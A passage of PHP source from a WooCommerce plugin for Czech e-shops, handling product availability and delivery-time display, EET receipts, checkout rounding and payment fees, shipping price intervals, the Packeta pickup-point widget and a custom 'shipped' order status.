      $availability['availability'] = $dostupnost['text'];
    }
    return $availability;
  }
  $dostupnost = ceske_sluzby_ziskat_predobjednavku( $product, false );
  if ( ! empty( $dostupnost ) ) {
    $availability['availability'] = $dostupnost;
    return $availability;
  }
  if ( $product->managing_stock() && (int)$product->get_stock_quantity() > 0 ) {
    $dostupnost = ceske_sluzby_ziskat_interval_pocet_skladem( $availability, (int)$product->get_stock_quantity() );
    if ( ! empty( $dostupnost ) ) {
      return $dostupnost;
    }
  }
  $dostupnost = ceske_sluzby_ziskat_nastavenou_dostupnost_produktu( $product, false );
  if ( ! empty( $dostupnost ) ) {
    if ( ( ! $product->is_on_backorder( 1 ) && (string)$dostupnost['value'] == '0' ) || (string)$dostupnost['value'] != '0' ) {
      $availability['availability'] = $dostupnost['text'];
      return $availability;
    }
  }
  if ( $product->is_on_backorder( 1 ) ) {
    $dostupnost = ceske_sluzby_ziskat_zadanou_dodaci_dobu( """", 98 );
    if ( ! empty( $dostupnost ) ) {
      $availability['availability'] = $dostupnost['text'];
    }
    return $availability;
  }
  return $availability;
}

function ceske_sluzby_zobrazit_dodaci_dobu_akce() {
  global $product;
  $format = """";
  if ( $product->is_type( 'variable' ) ) {
    return;
  }
  if ( ! $product->is_in_stock() ) {
    $dodaci_doba_text = ceske_sluzby_ziskat_zadanou_dodaci_dobu( """", 99 );
    if ( ! empty( $dodaci_doba_text ) ) {
      $dostupnost['value'] = 99;
      $dostupnost['text'] = $dodaci_doba_text['text'];
      $format = ceske_sluzby_ziskat_format_dodaci_doby( $dostupnost );
    }
    echo $format;
    return;
  }
  $format = ceske_sluzby_ziskat_predobjednavku( $product, true );
  if ( ! empty( $format ) ) {
    echo $format;
    return;
  }
  $availability = $product->get_availability();
  if ( $product->managing_stock() && (int)$product->get_stock_quantity() > 0 ) {
    $dostupnost = ceske_sluzby_ziskat_interval_pocet_skladem( $availability, (int)$product->get_stock_quantity() );
    echo '<p class=""skladem-' . $dostupnost['class']. '"">' . $dostupnost['availability'] . '</p>';
    return;
  }
  $dostupnost = ceske_sluzby_ziskat_nastavenou_dostupnost_produktu( $product, false );
  if ( ! empty( $dostupnost ) ) {
    if ( ( ! $product->is_on_backorder( 1 ) && (string)$dostupnost['value'] == '0' ) || (string)$dostupnost['value'] != '0' ) {
      $format = ceske_sluzby_ziskat_format_dodaci_doby( $dostupnost );
      echo $format;
    }
  }
  if ( $product->is_on_backorder( 1 ) ) {
    $dodaci_doba_text = ceske_sluzby_ziskat_zadanou_dodaci_dobu( """", 98 );
    if ( ! empty( $dodaci_doba_text ) ) {
      $dostupnost['value'] = 98;
      $dostupnost['text'] = $dodaci_doba_text['text'];
      $format = ceske_sluzby_ziskat_format_dodaci_doby( $dostupnost );
    }
    echo $format;
  }
}

function ceske_sluzby_nahradit_zobrazeny_text_deprecated( $html, $availability, $product ) {
  ceske_sluzby_nahradit_zobrazeny_text( $html, $product );
}

function ceske_sluzby_nahradit_zobrazeny_text( $html, $product ) {
  if ( get_class( $product ) == ""WC_Product_Simple"" ) {
    $html = """";
  }
  elseif ( get_class( $product ) == ""WC_Product_Variation"" ) {
    if ( ! $product->is_in_stock() ) {
      $dodaci_doba_text = ceske_sluzby_ziskat_zadanou_dodaci_dobu( """", 99 );
      if ( ! empty( $dodaci_doba_text ) ) {
        $dostupnost['value'] = 99;
        $dostupnost['text'] = $dodaci_doba_text;
        $html = ceske_sluzby_ziskat_format_dodaci_doby( $dostupnost );
      }
      return $html;
    }
    $html = ceske_sluzby_ziskat_predobjednavku( $product, true );
    if ( ! empty( $html ) ) {
      return $html;
    }
    if ( $product->managing_stock() && (int)$product->get_stock_quantity() > 0 ) {
      $availability = $product->get_availability();
      $dostupnost = ceske_sluzby_ziskat_interval_pocet_skladem( $availability, (int)$product->get_stock_quantity() );
      $html = '<p class=""skladem-' . $dostupnost['class']. '"">' . $dostupnost['availability'] . '</p>';
      return $html;
    }
    $dostupnost = ceske_sluzby_ziskat_nastavenou_dostupnost_produktu( $product, false );
    if ( ! empty( $dostupnost ) ) {
      $html = ceske_sluzby_ziskat_format_dodaci_doby( $dostupnost );
    }
  }
  return $html;
}

function ceske_sluzby_zobrazit_dodatecnou_dodaci_dobu_filtr( $data, $variable_product_object, $variation ) {
  $dostupnost = ceske_sluzby_ziskat_predobjednavku( $variation, false );
  if ( ! empty( $dostupnost ) ) {
    return $data;
  }
  $dostupnost = ceske_sluzby_ziskat_nastavenou_dostupnost_produktu( $variation, true );
  if ( $variation->managing_stock() && (int)$variation->get_stock_quantity() > 0 ) {
    $format = ceske_sluzby_ziskat_format_dodatecneho_poctu( $dostupnost, $variation );
    $data['availability_html'] .= $format;
  }
  return $data;
}

function ceske_sluzby_zobrazit_dodatecnou_dodaci_dobu_akce() {
  global $product;
  if ( ! $product->is_type( 'simple' ) ) {
    return;
  }
  $format = ceske_sluzby_ziskat_predobjednavku( $product, true );
  if ( ! empty( $format ) ) {
    return;
  }
  $dostupnost = ceske_sluzby_ziskat_nastavenou_dostupnost_produktu( $product, true );
  if ( $product->managing_stock() && (int)$product->get_stock_quantity() > 0 ) {
    $format = ceske_sluzby_ziskat_format_dodatecneho_poctu( $dostupnost, $product );
    echo $format;
  }
}

function ceske_sluzby_load_admin_scripts() {
  $screen = get_current_screen();
  $screen_id = $screen ? $screen->id : '';
  $predobjednavka = get_option( 'wc_ceske_sluzby_preorder-aktivace' );
  $aktivace_eet = get_option( 'wc_ceske_sluzby_dalsi_nastaveni_eet-aktivace' );
  if ( ( in_array( $screen_id, array( 'product', 'edit-product' ) ) && $predobjednavka == ""yes"" ) || $screen_id == 'shop_order' ) {
    wp_register_script( 'wc-admin-ceske-sluzby', untrailingslashit( plugins_url( '/', __FILE__ ) ) . '/js/ceske-sluzby-admin.js', array( 'jquery-ui-datepicker' ), CS_VERSION );
    wp_enqueue_script( 'wc-admin-ceske-sluzby' );
  }
  if ( in_array( $screen_id, array( 'woocommerce_page_wc-settings' ) ) && $aktivace_eet == ""yes"" ) {
    if ( ! did_action( 'wp_enqueue_media' ) ) {
      wp_enqueue_media();
    } 
    wp_register_script( 'wc-admin-ceske-sluzby-upload-button', untrailingslashit( plugins_url( '/', __FILE__ ) ) . '/js/ceske-sluzby-upload-button-admin.js', array( 'jquery' ), CS_VERSION );
    wp_enqueue_script( 'wc-admin-ceske-sluzby-upload-button' );
  }
}

function ceske_sluzby_povolit_nahravani_certifikatu( $mime_types ) {
  $mime_types['p12'] = 'application/x-pkcs12';
  return $mime_types;
}

function ceske_sluzby_zobrazit_eet_email( $order, $sent_to_admin, $plain_text, $email ) {
  if ( $email->id == 'customer_completed_order' || $email->id == 'customer_processing_order' || $email->id == 'customer_invoice' ) {
    $eet_format = zkontrolovat_nastavenou_hodnotu( $order, array( 'wc_ceske_sluzby_nastaveni_pokladna', 'wc_ceske_sluzby_nastaveni_pokladna_doprava' ), 'wc_ceske_sluzby_eet_format', 'eet_format', 'ceske_sluzby_eet_format' );
    if ( ! empty( $eet_format ) && ( $eet_format == 'email-completed' || $eet_format == 'email-processing' || $eet_format == 'email-faktura' ) ) {
      $eet = new Ceske_Sluzby_EET();
      $order_id = is_callable( array( $order, 'get_id' ) ) ? $order->get_id() : $order->id;
      if ( $plain_text ) {
        $eet->ceske_sluzby_zobrazit_eet_uctenku( $order_id, false, '', '', true );
      } else {
        $eet->ceske_sluzby_zobrazit_eet_uctenku( $order_id, false, '<br>' );
      }
    }
  }
}

function ceske_sluzby_zobrazit_eet_faktura_externi( $template_type, $order ) {
  $eet_format = zkontrolovat_nastavenou_hodnotu( $order, array( 'wc_ceske_sluzby_nastaveni_pokladna', 'wc_ceske_sluzby_nastaveni_pokladna_doprava' ), 'wc_ceske_sluzby_eet_format', 'eet_format', 'ceske_sluzby_eet_format' );
  if ( ! empty( $eet_format ) && $eet_format == 'faktura-plugin' ) {
    $eet = new Ceske_Sluzby_EET();
    $order_id = is_callable( array( $order, 'get_id' ) ) ? $order->get_id() : $order->id;
    $eet->ceske_sluzby_zobrazit_eet_uctenku( $order_id, false );
  }
}

function ceske_sluzby_automaticky_ziskat_uctenku( $order_id ) {
  $order = wc_get_order( $order_id );
  $eet_podminka = zkontrolovat_nastavenou_hodnotu( $order, array( 'wc_ceske_sluzby_nastaveni_pokladna', 'wc_ceske_sluzby_nastaveni_pokladna_doprava' ), 'wc_ceske_sluzby_eet_podminka', 'eet_podminka', 'ceske_sluzby_eet_podminka' );
  if ( ! empty( $eet_podminka ) && ( $eet_podminka == 'platba' || $eet_podminka == 'dokonceno' ) ) {
    $eet = new Ceske_Sluzby_EET();
    $odeslana_trzba = $eet->ziskat_odeslanou_trzbu( $order );
    if ( $odeslana_trzba > 0 ) {
      $eet->ceske_sluzby_ziskat_eet_uctenku( $order );
    }
  }
}

function ceske_sluzby_spustit_zaokrouhlovani( $cart ) {
  $zaokrouhlovani = zkontrolovat_nastavenou_hodnotu( '', array( 'wc_ceske_sluzby_nastaveni_pokladna' ), 'wc_ceske_sluzby_dalsi_nastaveni_zaokrouhleni', 'zaokrouhlovani', 'ceske_sluzby_zaokrouhleni' );
  if ( $zaokrouhlovani == 'nahoru' ) {
    if ( version_compare( WC_VERSION, '3.2', '<' ) ) {
      $dalsi_poplatky = is_callable( array( $cart, 'get_fees' ) ) ? $cart->get_fees() : $cart->fees;
      $cart->calculate_fees();
      if ( ! empty( $dalsi_poplatky ) ) {
        foreach ( $dalsi_poplatky as $poplatek ) {
          if ( $poplatek->taxable ) {
            $id_sazby = key( $poplatek->tax_data );
            if ( array_key_exists( $id_sazby, $cart->taxes ) )  {
              $cart->taxes[$id_sazby] = $cart->taxes[$id_sazby] - $poplatek->tax;
            }
          }
        }
      }
      if ( $cart->round_at_subtotal && wc_tax_enabled() ) {
        $cart->tax_total = WC_Tax::get_tax_total( $cart->taxes );
      } else {
        $cart->tax_total = array_sum( $cart->taxes );
      }
    } else {
      new WC_Cart_Totals( $cart );
    }
  }
}

function ceske_sluzby_zaokrouhlovani_poplatek_dane( $cart ) {
  $taxes['tax_class'] = '';
  $taxes['tax_rates'] = array();
  $shipping_tax_class = get_option( 'woocommerce_shipping_tax_class' );
  if ( ( version_compare( WC_VERSION, '3.0', '<' ) && $shipping_tax_class == '' ) || ( version_compare( WC_VERSION, '3.0', '=>' ) && $shipping_tax_class == 'inherit' ) ) {
    $cart_taxes = is_callable( array( $cart, 'get_cart_contents_taxes' ) ) ? $cart->get_cart_contents_taxes() : $cart->taxes;
    foreach ( $cart_taxes as $rate_id => $tax_rate ) {
      $shipping_taxes = is_callable( array( $cart, 'get_shipping_taxes' ) ) ? $cart->get_shipping_taxes() : $cart->shipping_taxes;
      if ( array_key_exists( $rate_id, $shipping_taxes ) ) {
        $tax_rate = $tax_rate + $shipping_taxes[$rate_id];
      }
      $kompletni_dane[$rate_id] = $tax_rate;
    }
    if ( ! empty( $kompletni_dane ) && is_array( $kompletni_dane ) ) {
      $max_dan = array_keys( $kompletni_dane, max( $kompletni_dane ) );
      if ( ! empty( $max_dan ) && is_array( $max_dan ) ) {
        foreach ( $max_dan as $rate_id ) {
          $tax_class_tmp = wc_get_tax_class_by_tax_id( $rate_id );
          $tax_rates_tmp = WC_Tax::get_rates( $tax_class_tmp );
          $sazba_tmp = $tax_rates_tmp[$rate_id]['rate'];
          if ( $sazba_tmp >= 0 ) {
            $taxes['tax_rates'] = $tax_rates_tmp;
            $taxes['tax_class'] = $tax_class_tmp;
          }
        }
      }
    }
  }
  else {
    $taxes['tax_rates'] = WC_Tax::get_rates( $shipping_tax_class );
    $taxes['tax_class'] = $shipping_tax_class;  
  }
  return $taxes;
}

function ceske_sluzby_zaokrouhlovani_poplatek( $cart ) {
  $dane = false;
  $tax_class = '';
  $decimals = get_option( 'woocommerce_price_num_decimals' );
  $poplatek = zkontrolovat_nastavenou_hodnotu( '', array( 'wc_ceske_sluzby_nastaveni_pokladna', 'wc_ceske_sluzby_nastaveni_pokladna_doprava' ), 'wc_ceske_sluzby_doprava_poplatek_platba', 'poplatek_platba', 'ceske_sluzby_poplatek_platba' );
  $poplatek = str_replace( ',', '.', $poplatek );
  $poplatek = floatval( $poplatek );
  if ( ! empty( $poplatek ) ) {
    $poplatek_celkem = $poplatek;
    $nazev_poplatku = get_option( 'wc_ceske_sluzby_doprava_poplatek_platba_nazev' );
    if ( empty( $nazev_poplatku ) ) {
      $nazev_poplatku = 'Poplatek za způsob platby';
    }
    if ( wc_tax_enabled() ) {
      $dane = true;
      $taxes = ceske_sluzby_zaokrouhlovani_poplatek_dane( $cart );
      $tax_class = $taxes['tax_class'];
      $cena_dan = get_option( 'woocommerce_prices_include_tax' );
      if ( $cena_dan == 'yes' ) {
        $dan_poplatek = WC_Tax::calc_tax( $poplatek, $taxes['tax_rates'], true );
        $poplatek_celkem = $poplatek - reset( $dan_poplatek );
      }
    }
    $cart->add_fee( $nazev_poplatku, $poplatek_celkem, $dane, $tax_class );
  }
  if ( $cart->total > 0 && $decimals > 0 ) {
    $zaokrouhlovani = zkontrolovat_nastavenou_hodnotu( '', array( 'wc_ceske_sluzby_nastaveni_pokladna' ), 'wc_ceske_sluzby_dalsi_nastaveni_zaokrouhleni', 'zaokrouhlovani', 'ceske_sluzby_zaokrouhleni' );
    if ( $zaokrouhlovani == 'nahoru' ) {
      $celkem = $cart->total;
      $zao_total = ceil( $cart->total ) - $celkem;
      $zao = $zao_total;
      if ( wc_tax_enabled() ) {
        $dane = true;
        $taxes = ceske_sluzby_zaokrouhlovani_poplatek_dane( $cart );
        $tax_class = $taxes['tax_class'];
        $zao_taxes = WC_Tax::calc_tax( $zao_total, $taxes['tax_rates'], true );
        $zao = $zao_total - reset( $zao_taxes );
      }
      if ( $zao > 0 ) {
        $cart->add_fee( 'Zaokrouhlení', $zao, $dane, $tax_class );
        $cart->total += $zao_total;
      }
    }
  }
}

function ceske_sluzby_aktualizovat_checkout_javascript() {
  if ( is_checkout() ) {
    $nastaveni_pokladna = get_option( 'wc_ceske_sluzby_nastaveni_pokladna' );
    $nastaveni_pokladna_doprava = get_option( 'wc_ceske_sluzby_nastaveni_pokladna_doprava' );
    if ( ( is_array( $nastaveni_pokladna ) && ( in_array( 'zaokrouhlovani', $nastaveni_pokladna ) || in_array( 'poplatek_platba', $nastaveni_pokladna ) ) ) || 
    ( is_array( $nastaveni_pokladna_doprava ) && in_array( 'poplatek_platba', $nastaveni_pokladna_doprava ) ) ) { ?>
      <script type=""text/javascript"">
        jQuery(document).ready(function($){
          $(document.body).off().on('change', 'input[name=""payment_method""]', function() {
            $('body').trigger('update_checkout');
          });
        });
      </script><?php
    }
  } 
}

function ceske_sluzby_compare_sazba( $a, $b ) {
  if ( $a->sazba == $b->sazba ) {
    return 0;
  }
  return ( $a->sazba > $b->sazba ) ? -1 : 1;
}

function ceske_sluzby_doplnit_danovou_sazbu( $tax_totals ) {
  foreach ( $tax_totals as $code => $tax ) {
    $tax_class = wc_get_tax_class_by_tax_id( $tax->rate_id );
    $tax_rates = WC_Tax::get_rates( $tax_class );
    if ( array_key_exists( $tax->rate_id, $tax_rates ) && array_key_exists( 'rate', $tax_rates[$tax->rate_id] ) ) {
      $tax_totals[ $code ]->sazba = (float)$tax_rates[$tax->rate_id]['rate'];
    }
  }
  if ( ! empty( $tax_totals ) ) {
    usort( $tax_totals, 'ceske_sluzby_compare_sazba' );
  }
  return $tax_totals;
}

function ceske_sluzby_dostupne_platebni_metody( $available_gateways ) {
  if ( ! is_admin() ) {
    $platebni_metody = zkontrolovat_nastavenou_hodnotu( '', array( 'wc_ceske_sluzby_nastaveni_doprava' ), '', 'platebni_metody', 'ceske_sluzby_platebni_metody' );
    if ( ! empty( $platebni_metody ) ) {
      foreach ( $platebni_metody as $platebni_metoda ) {
        if ( array_key_exists( $platebni_metoda, $available_gateways ) ) {
          unset( $available_gateways[$platebni_metoda] );
        }
      }
    }
  }
  return $available_gateways;
}

function ceske_sluzby_zmena_zaokrouhlovani_dani( $in ) {
  return round( $in, wc_get_price_decimals() );
}

function ceske_sluzby_zmena_kalkulace_dani( $taxes ) {
  $taxes = array_map( 'ceske_sluzby_rounding', $taxes );
  return $taxes;
};

function ceske_sluzby_rounding( $in ) {
  return round( $in, wc_get_price_decimals() );
}

function ceske_sluzby_zobrazeni_dodaci_doby_administrace( $stock_html, $produkt ) {
  $dodatek = """";
  if ( $produkt->is_type( 'simple' ) ) {
    $source = """";
    if ( ! $produkt->is_in_stock() ) {
      $dodaci_doba = ceske_sluzby_ziskat_zadanou_dodaci_dobu( """", 99 );
      if ( ! empty( $dodaci_doba ) ) {
        $source = ' class=""neni-skladem""';
        $stock_html .= '<br><span' . $source . '>' . $dodaci_doba['text'] . '</span>';
      }
      return $stock_html;
    }
    $dodaci_doba = ceske_sluzby_ziskat_nastavenou_dostupnost_produktu( $produkt, false );
    if ( ! empty( $dodaci_doba ) ) {
      if ( ( ! $produkt->is_on_backorder( 1 ) && (string)$dodaci_doba['value'] == '0' ) || (string)$dodaci_doba['value'] != '0' ) {
        if ( isset( $dodaci_doba['source'] ) ) {
          $source = ' class=""' . $dodaci_doba['source'] . '""';
        }
        $stock_html .= '<br><span' . $source . '>' . $dodaci_doba['text'] . '</span>';
        return $stock_html;
      }
    }
    if ( $produkt->is_on_backorder( 1 ) ) {
      $dodaci_doba = ceske_sluzby_ziskat_zadanou_dodaci_dobu( """", 98 );
      if ( ! empty( $dodaci_doba ) ) {
        $source = ' class=""objednavka""';
        $stock_html .= '<br><span' . $source . '>' . $dodaci_doba['text'] . '</span>';
      }
      return $stock_html;
    }
  }
  if ( $produkt->is_type( 'variable' ) ) {
    $dostupne_varianty = $produkt->get_available_variations();
    if ( ! empty( $dostupne_varianty ) ) {
      foreach ( $dostupne_varianty as $variation ) {
        $varianta = wc_get_product( $variation['variation_id'] );
        $attributes_varianta = $varianta->get_variation_attributes();
        if ( ! empty( $attributes_varianta ) ) {
          $source = """";
          $dodaci_doba = ceske_sluzby_ziskat_nastavenou_dostupnost_produktu( $varianta, false );
          $value_html = """";
          $i = 0;
          foreach ( $attributes_varianta as $key => $value ) {
            if ( $i == 0 ) {
              $value_html = $value;
            } else {
              $value_html .= ' & ' . $value;
            }
            $i = $i + 1;
          }
          if ( isset( $dodaci_doba['source'] ) ) {
            $source = ' class=""' . $dodaci_doba['source'] .'""';
            if ( $dodaci_doba['source'] == ""product"" ) {
              $dodatek = ' title=""Nastaveno na úrovni produktu""';
            }
          }
          if ( empty( $dodaci_doba ) ) {
            $availability = $varianta->get_availability();
            $dodaci_doba['text'] = $availability['availability'];
          }
          $stock_html .= '<br><span' . $source . $dodatek . '>' . $value_html . ': ' . $dodaci_doba['text'] . '</span>';
        }
      }
    }
  }
  return $stock_html;
}

function ceske_sluzby_zobrazeni_dodaci_doby_administrace_css() {
  global $pagenow;
  if ( $pagenow == 'edit.php' || $pagenow == 'post.php' ) { ?>
    <style type=""text/css"">
      table.wp-list-table .manage-column.column-is_in_stock {
        width: 15%;
      }
      span.external {
        font-size: 11px;
        color: grey;
      }
    </style>
  <?php }
}

function ceske_sluzby_zobrazeni_dodaci_doby_varianty( $variation ) {
  $source = """";
  $dodatek = """";
  $varianta = wc_get_product( $variation->ID );
  $dodaci_doba = ceske_sluzby_ziskat_nastavenou_dostupnost_produktu( $varianta, false );
  if ( $dodaci_doba ) {
    if ( isset( $dodaci_doba['source'] ) ) {
      $source = ' class=""' . $dodaci_doba['source'] .'""';
      if ( $dodaci_doba['source'] == ""product"" ) {
        $dodatek = ' (nastaveno na úrovni produktu)';
      }
    }
    echo '<span' . $source . '>' . $dodaci_doba['text'] . $dodatek . '</span>';
  }
}

// http://docs.packetery.com/01-pickup-point-selection/01-widget.html#toc-quick-start-examples
function ceske_sluzby_zasilkovna_scripts_checkout() {
  if ( is_checkout() ) {
    $zasilkovna_settings = get_option( 'woocommerce_ceske_sluzby_zasilkovna_settings' ); 
    if ( isset( $zasilkovna_settings['zasilkovna_api-klic'] ) && ! empty( $zasilkovna_settings['zasilkovna_api-klic'] ) ) {
      $api_klic = $zasilkovna_settings['zasilkovna_api-klic']; ?>
      <script src=""https://widget.packeta.com/www/js/library.js""></script>
      <script type=""text/javascript"">
        var packetaApiKey = '<?php echo $api_klic; ?>';
        var $storage_support = true;
        try {
          $storage_support = ( 'sessionStorage' in window && window.sessionStorage !== null );
          window.localStorage.setItem( 'ceske_sluzby', 'test' );
          window.localStorage.removeItem( 'ceske_sluzby' );
        } catch( err ) {
          $storage_support = false;
        }
        if ( $storage_support ) {
          jQuery( document ).ready(function( $ ) {
            $( document.body ).on( 'updated_checkout', function() {
              var ceske_sluzby_zasilkovna = localStorage.getItem( 'ceske_sluzby_zasilkovna' );
              if ( document.getElementById( 'packeta-point-info' ) !== null ) {
                var paragraph = document.getElementById( 'packeta-point-info' ).firstChild;
                if ( ceske_sluzby_zasilkovna !== null ) {
                  paragraph.nodeValue = ceske_sluzby_zasilkovna;
                  document.getElementById( 'packeta-point-id' ).value = ceske_sluzby_zasilkovna;
                } else if ( paragraph !== ""Zatím nevybráno"" ) {
                  paragraph.nodeValue = ""Zatím nevybráno"";
                }
              }
            })
          });
        }
        function showSelectedPickupPoint(point) {
          var spanElement = document.getElementById( 'packeta-point-info' );
          var idElement = document.getElementById( 'packeta-point-id' );
          if ( point ) {
            spanElement.innerText = point.name;
            idElement.value = point.name;
            if ( $storage_support ) {
              localStorage.setItem( 'ceske_sluzby_zasilkovna', point.name );
            }
          }
          else {
            if ( $storage_support ) {
              var ceske_sluzby_zasilkovna = localStorage.getItem( 'ceske_sluzby_zasilkovna' );
            } else {
              var ceske_sluzby_zasilkovna = null;
            }
            if ( ceske_sluzby_zasilkovna !== null ) {
              spanElement.innerText = ceske_sluzby_zasilkovna;
              idElement.value = ceske_sluzby_zasilkovna;
            } else {
              spanElement.innerText = ""Zatím nevybráno"";
              idElement.value = """";
            }
          }
        };
      </script>
    <?php }
  }
}

add_filter( 'woocommerce_package_rates', 'ceske_sluzby_doprava_cenove_intervaly' );
function ceske_sluzby_doprava_cenove_intervaly( $rates ) {
  if ( ! is_admin() ) {
    $nastaveni_doprava = get_option( 'wc_ceske_sluzby_nastaveni_doprava' );
    if ( is_array( $nastaveni_doprava ) && in_array( 'cena_dopravy', $nastaveni_doprava ) ) {
      $available_shipping = WC()->shipping->load_shipping_methods();
      $cena_kosik = WC()->cart->subtotal;
      $ceny_doprava = get_option( 'wc_ceske_sluzby_dalsi_nastaveni_doprava-zpusob-dane' );
      foreach( $rates as $key => $rate ) {
        $cena_dopravy_array = array();
        if ( strpos( $key, ':' ) === false ) {
          if ( isset( $available_shipping[ $key ] ) ) {
            $shipping_method = $available_shipping[$key];
            $settings = $shipping_method->settings;
          }
        } else {
          $pieces = explode( "":"", $key );
          if ( is_array( $pieces ) && ! empty( $pieces ) && count( $pieces ) == 2 ) {
            $order_method = $pieces[0];
            $order_instance = $pieces[1];
            if ( is_numeric( $order_instance ) ) {
              $shipping_method = WC_Shipping_Zones::get_shipping_method( $order_instance );
              $settings = $shipping_method->instance_settings;
            }
          }
        }
        if ( isset( $settings['ceske_sluzby_cena_dopravy'] ) && ! empty( $settings['ceske_sluzby_cena_dopravy'] ) ) {
          $cena_dopravy_array = ceske_sluzby_zpracovat_ceny_dopravy( $settings['ceske_sluzby_cena_dopravy'], $cena_kosik );
        }
        if ( empty( $cena_dopravy_array ) && wc_prices_include_tax() && $ceny_doprava == 'yes' ) {
          $cena_dopravy_array['cena'] = $rates[$key]->cost;
        }
        if ( ! empty( $cena_dopravy_array ) ) {
          if ( $cena_dopravy_array['cena'] == 0 ) {
            $rates[$key]->taxes = 0;
          }
          $new_cost = wc_format_decimal( $cena_dopravy_array['cena'], wc_get_price_decimals() );
          $rates[$key]->cost = $new_cost;
          if ( wc_tax_enabled() && false !== $rates[$key]->taxes && $rates[$key]->cost > 0 && $shipping_method->is_taxable()) {
            if ( wc_prices_include_tax() ) {
              $taxes = WC_Tax::calc_inclusive_tax( $new_cost, WC_Tax::get_shipping_tax_rates() );
            } else {
              $taxes = WC_Tax::calc_exclusive_tax( $new_cost, WC_Tax::get_shipping_tax_rates() );
            }
            $rates[$key]->taxes = $taxes;
          }
          if ( wc_prices_include_tax() && $rates[$key]->cost > 0 ) {
            $rates[$key]->cost = $new_cost - current( $taxes );
          }
        }
      }
    }
  }
  return $rates;
}

add_filter( 'woocommerce_cart_shipping_method_full_label', 'ceske_sluzby_doprava_text_pro_dopravu_zdarma', 10, 2 );
function ceske_sluzby_doprava_text_pro_dopravu_zdarma( $label, $method ) {
  if ( $method->cost == 0 ) {
    $text_doprava_zdarma = get_option( 'wc_ceske_sluzby_dalsi_nastaveni_doprava-text-dopravy-zdarma' );
    if ( ! empty( $text_doprava_zdarma ) ) {
      if ( $text_doprava_zdarma == '{VALUE}' ) {
        $label .= ': ' . wc_price( $method->cost );
      } else {
        $label .= ': <span class=""woocommerce-Price-amount amount"">' . $text_doprava_zdarma . '</span>';
      }
    }
  }
  return $label;
}

function ceske_sluzby_zmena_stavu_objednavky_platba_predem( $status, $order ) {
  return 'processing';
}

function ceske_sluzby_moznost_odesilat_emaily_zmena_stavu_platba_predem( $email_actions ) {
  $email_actions[] = 'woocommerce_order_status_processing_to_on-hold';
  return $email_actions;
}

function ceske_sluzby_zmena_emailovych_notifikaci_platba_predem( $email_class ) {
  remove_action( 'woocommerce_order_status_on-hold_to_processing_notification', array( $email_class->emails['WC_Email_Customer_Processing_Order'], 'trigger' ) );
  add_action( 'woocommerce_order_status_processing_to_on-hold_notification', array( $email_class->emails['WC_Email_Customer_On_Hold_Order'], 'trigger' ) );
}

function ceske_sluzby_odebrat_bankovni_ucet_po_dokonceni_objednavky() {
  if ( ! function_exists( 'WC' ) ) {
    return;
  }
  $available_gateways = WC()->payment_gateways()->get_available_payment_gateways();
  $gateway = isset( $available_gateways['bacs'] ) ? $available_gateways['bacs'] : false;
  if ( false == $gateway ) {
    return;
  }
  remove_action( 'woocommerce_thankyou_bacs', array( $gateway, 'thankyou_page' ) );
}

add_filter( 'woocommerce_admin_order_actions', 'ceske_sluzby_zmena_stavu_platba_predem_administrace_ikony', 100, 2 );
function ceske_sluzby_zmena_stavu_platba_predem_administrace_ikony( $actions, $order ) {
  $zmena_platby_predem = get_option( 'wc_ceske_sluzby_dalsi_nastaveni_zmena-platby-predem' );
  $aktivace_odeslano = get_option( 'wc_ceske_sluzby_dalsi_nastaveni_status-odeslano' );
  if ( $zmena_platby_predem == ""yes"" ) {
    if ( $order->has_status( 'processing' ) ) {
      $on_hold = array( 'on-hold' => array(
        'url' => wp_nonce_url( admin_url( 'admin-ajax.php?action=woocommerce_mark_order_status&status=on-hold&order_id=' . $order->get_id() ), 'woocommerce-mark-order-status' ),
        'name' => __( 'On-hold', 'woocommerce' ),
        'action' => 'on-hold',
      ) );
      $actions = array_merge( $on_hold, $actions );
      unset( $actions['complete'] );
    }
    if ( $order->has_status( 'odeslano' ) ) {
      $actions['complete'] = array(
        'url' => wp_nonce_url( admin_url( 'admin-ajax.php?action=woocommerce_mark_order_status&status=completed&order_id=' . $order->get_id() ), 'woocommerce-mark-order-status' ),
        'name' => __( 'Complete', 'woocommerce' ),
        'action' => 'complete',
      );
    }
    unset( $actions['processing'] );
  }
  elseif ( $aktivace_odeslano == ""yes"" ) {
    if ( $order->has_status( 'odeslano' ) ) {
      $actions['complete'] = array(
        'url' => wp_nonce_url( admin_url( 'admin-ajax.php?action=woocommerce_mark_order_status&status=completed&order_id=' . $order->get_id() ), 'woocommerce-mark-order-status' ),
        'name' => __( 'Complete', 'woocommerce' ),
        'action' => 'complete',
      );
    }
  }
  return $actions;
}

function ceske_sluzby_stylovani_tlacitek_objednavky_administrace_css() {
  global $pagenow;
  if ( $pagenow == 'edit.php' || $pagenow == 'post.php' ) { ?>
    <style type=""text/css"">
      .widefat .column-wc_actions a.on-hold::after {
        font-family: ""WooCommerce"";
        content: ""\e00f"";
      }
    </style>
  <?php }
}

add_action( 'init', 'ceske_sluzby_registrace_stavu_objednavky_odeslano' );
function ceske_sluzby_registrace_stavu_objednavky_odeslano() {
  $aktivace_odeslano = get_option( 'wc_ceske_sluzby_dalsi_nastaveni_status-odeslano' );
  if ( $aktivace_odeslano == ""yes"" ) {
    register_post_status( 'wc-odeslano', array(
      'label' => 'Odesláno',
      'public' => true,
      'show_in_admin_status_list' => true,
      'show_in_admin_all_list' => true,
      'exclude_from_search' => false,
      'label_count' => _n_noop( 'Odesláno <span class=""count"">(%s)</span>', 'Odesláno <span class=""count"">(%s)</span>' )
    ) );
    add_filter( 'wc_order_statuses', 'ceske_sluzby_zobrazovat_status_objednano' );
  }
}

function ceske_sluzby_zobrazovat_status_objednano( $order_statuses ) {
  $new_order_statuses = array();
  foreach ( $order_statuses as $key => $status ) {
    $new_order_statuses[ $key ] = $status;
    if ( 'wc-processing' === $key || 'wc-on-hold' === $key ) {
      $new_order_statuses['wc-odeslano'] = 'Odesláno';
    }
  }
  return $new_order_statuses;
}

add_filter( 'woocommerce_order_number', 'ceske_sluzby_zmenit_cislo_objednavky', 10, 2 );
function ceske_sluzby_zmenit_cislo_objednavky( $order_id, $order ) {
  $format_cisla = get_option( 'wc_ceske_sluzby_format_cisla_objednavky' );
  if ( ! empty( $format_cisla ) && $format_cisla == ""{DATE:Ymd}{SEQUENCE:d|2}"" ) {
    $cislo_objednavky = get_post_meta( $order_id, '_ceske_sluzby_cislo_objednavky', true );
    if ( ! empty( $cislo_objednavky ) ) {
      return $cislo_objednavky;
    }
  }
  return $order_id;
}

// https://github.com/joydipnath/Custom-Order-Number-Woo
add_action( 'woocommerce_new_order', 'ceske_sluzby_ulozit_nastavene_cislo_objednavky' );
